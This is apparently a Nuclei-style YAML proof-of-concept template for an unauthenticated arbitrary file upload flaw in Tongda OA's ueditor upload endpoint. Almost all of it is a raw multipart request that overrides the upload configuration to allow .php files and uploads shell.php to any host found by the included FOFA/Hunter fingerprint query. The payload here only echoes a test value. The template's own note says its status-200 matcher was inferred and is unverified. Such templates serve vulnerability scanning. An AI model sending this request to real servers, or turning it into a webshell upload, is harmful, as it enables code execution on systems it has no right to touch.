id: poc-8d5cafd4b143a54a4ca8
info:
  name: 通达OAaction存在前台任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8d5cafd4b143a54a4ca857321732b32e

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 8d5cafd4b143a54a4ca857321732b32e
    fofa: + hunter`app.name="通达 OA"`
http:
- raw:
  - 'POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Connection: keep-alive

    Content-Length: 605


    --00content0boundary00

    Content-Disposition: form-data; name="CONFIG[fileFieldName]"


    filename

    --00content0boundary00

    Content-Disposition: form-data; name="CONFIG[fileMaxSize]"


    10000

    --00content0boundary00

    Content-Disposition: form-data; name="CONFIG[filePathFormat]"


    shell

    --00content0boundary00

    Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"


    .php

    --00content0boundary00

    Content-Disposition: form-data; name="mufile"


    submit

    --00content0boundary00

    Content-Disposition: form-data; name="filename"; filename="shell.php"


    <?php echo 123;?>

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
